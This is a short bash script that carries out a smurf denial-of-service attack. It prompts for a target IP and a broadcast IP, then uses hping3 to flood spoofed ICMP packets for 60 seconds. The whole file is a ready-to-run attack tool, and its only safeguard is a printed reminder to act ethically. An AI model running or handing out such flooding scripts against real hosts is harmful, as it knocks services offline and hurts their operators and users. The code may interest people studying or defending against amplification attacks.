#!/bin/bash

ask_input() {
  read -p "Enter the target IP: " target_ip
  read -p "Enter the broadcast IP: " broadcast_ip
}

smurf_attack() {
  timeout=60
  trap 'echo "Attack stopped by user."; exit 0' INT
  echo "Starting smurf attack against $target_ip using $broadcast_ip for $timeout seconds."
  time sudo hping3 --flood --icmp --spoof $target_ip $broadcast_ip &
  pid=$!
  sleep $timeout || wait $pid
  kill -9 $pid 2>/dev/null
  echo "Attack finished."
}

check_input() {
  if [[ -z $target_ip || -z $broadcast_ip ]]; then
    echo "Invalid input. Please try again."
    ask_input
    check_input
  fi
}

echo "This script will perform a smurf attack using hping3."
echo "Please be careful and ethical when using this script and do not attack any servers without permission."
ask_input
check_input
smurf_attack
